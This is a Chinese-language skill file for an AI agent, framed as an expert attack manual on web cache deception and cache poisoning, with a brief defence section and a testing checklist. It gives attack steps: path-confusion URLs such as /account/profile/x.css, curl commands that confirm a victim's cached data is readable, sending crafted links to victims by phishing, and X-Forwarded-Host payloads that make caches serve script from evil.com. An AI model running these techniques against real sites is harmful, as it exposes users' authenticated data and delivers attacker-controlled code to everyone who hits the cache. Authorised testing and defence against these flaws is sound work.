# 技能：Web 缓存欺骗——专家攻击手册

> **AI 加载指令**：Web 缓存欺骗和中毒技术。涵盖路径混淆攻击、CDN 缓存行为利用、缓存键操控，以及缓存欺骗（窃取数据）与缓存中毒（提供恶意内容）的区别。由 Omer Gil 在 Black Hat 2017 上提出，并在此后显著扩展。

### 高级参考

当您需要时，也加载 [CACHE_POISONING_TECHNIQUES.md](./CACHE_POISONING_TECHNIQUES.md)：
- Web 缓存中毒与 Web 缓存欺骗——清晰的区分和攻击流程对比
- 无键头中毒（X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、多个 Host 头）
- 无键参数中毒（utm_content、fbclid、callback、反射但不在缓存键中）
- 胖 GET 缓存中毒（请求体参数反射但无键）
- 通过分号和重复参数解析差异进行参数伪装
- CDN 特定行为：Cloudflare、CloudFront、Akamai、Varnish、Fastly（缓存键组成、调试头、ESI）
- Vary 头操控、缓存分区攻击和缺失 Vary 漏洞

## 1. 核心概念

### Web 缓存欺骗（窃取认证数据）

攻击者诱骗受害者请求其认证页面，但该页面在缓存中被视为静态：

```
受害者访问：https://target.com/account/profile/nonexistent.css
→ 应用程序忽略 "nonexistent.css"，提供 /account/profile（含认证数据）
→ CDN 看到 .css 扩展名 → 缓存响应
→ 攻击者获取：https://target.com/account/profile/nonexistent.css
→ CDN 提供缓存的认证内容 → 攻击者读取受害者的数据
```

### Web 缓存中毒（提供恶意内容）

攻击者操控无键请求组件（头、Cookie）使缓存存储恶意响应：

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ 应用程序生成：<script src="https://evil.com/js/app.js">
→ 缓存此响应
→ 普通用户命中缓存 → 加载攻击者的 JavaScript
```

---

## 2. 缓存欺骗——攻击方法

### 第 1 步：识别可缓存路径模式

CDN 通常按文件扩展名缓存：
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (有时)
```

### 第 2 步：测试路径混淆

```text
# 将静态扩展名附加到认证端点：
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

# 路径遍历风格：
https://target.com/account/profile/..%2fstatic/app.css
```

### 第 3 步：验证缓存

```bash
# 以受害者身份请求（认证）：
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

# 检查响应头：
# X-Cache: MISS (第一次请求)
# Age: 0

# 再次以攻击者身份请求（无认证）：
curl https://target.com/account/profile/x.css

# 检查响应：
# X-Cache: HIT
# 包含受害者的认证内容？→ 可利用
```

### 第 4 步：发送给受害者

通过钓鱼、消息或嵌入发送精心构造的 URL 给受害者：
```
https://target.com/account/profile/tracking.gif
```

---

## 3. 缓存中毒——攻击方法

### 无键输入发现

缓存键通常包括：`Host`、URL 路径、查询字符串。
这些通常**不**在缓存键中：`X-Forwarded-Host`、`X-Forwarded-Scheme`、`X-Original-URL`、Cookie、自定义头。

```bash
# 测试 X-Forwarded-Host 是否反射但无键：
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# 如果响应包含 evil.com 且缓存 → 可中毒
```

### 常见无键头

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### 通过 Host 头进行缓存中毒

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ 响应： <link href="//evil.com/static/main.css">
→ 缓存 → 所有用户加载攻击者的 CSS/JS
```

---

## 4. 路径规范化差异

缓存欺骗的关键：**CDN 和应用程序对路径的规范化方式不同**。

| 组件 | 行为 |
|---|---|
| CDN (Cloudflare, Akamai) | 基于 URL 路径（含扩展名）缓存 |
| 应用程序 (Rails, Django, Express) | 可能忽略尾部路径段或扩展名 |
| 反向代理 (Nginx) | 可能剥离或重写转发前的路径 |

```text
# 应用程序将这些视为等效：
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

# CDN 将 .css 视为可缓存的静态资源
→ 不匹配 = 漏洞
```

---

## 5. 缓存中毒现实模式

### X-Forwarded-Host → Open Graph / Meta 标签注入

```text
# 目标页面使用 X-Forwarded-Host 生成 Meta 标签：
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 响应：
<meta property="og:image" content="https://evil.com/assets/logo.png">
# 或：
<link rel="canonical" href="https://evil.com/">

# 如果响应被缓存 → 所有用户看到 evil.com 引用
# 影响：通过注入的 JS 路径的 XSS、通过 canonical 重定向的钓鱼、SEO 劫持
```

### 使用路径分隔符技巧的缓存欺骗

```text
# 分号（某些框架将其视为路径参数）：
/account/profile;.css

# 编码分隔符：
/account/profile%2F.css

# 尾部点/空格：
/account/profile/.css
/account/profile .css
```

---

## 6. 防御

### 针对缓存欺骗

- 仅缓存显式静态路径（例如，`/static/*`，`/assets/*`）
- 绝不单独基于文件扩展名缓存
- 在认证端点设置 `Cache-Control: no-store, private`
- 使用 `Vary: Cookie` 防止跨用户缓存命中

### 针对缓存中毒

- 将所有反射头包含在缓存键中
- 验证和清理 `X-Forwarded-*` 头
- 对动态内容使用 `Cache-Control: no-cache`
- 在 CDN 边缘剥离未知头

---

## 6. 测试清单

```
□ 识别 CDN/缓存层（X-Cache、Age、Via 头）
□ 将 .css/.js/.png 附加到认证 API 端点
□ 检查响应是否缓存（第二次请求的 X-Cache: HIT）
□ 测试路径分隔符：/x.css, ;.css, %2F.css
□ 测试无键头：X-Forwarded-Host, X-Original-URL
□ 验证敏感端点的 Cache-Control 头
□ 检查 Vary 头是否存在
□ 认证和非认证情况下测试
```
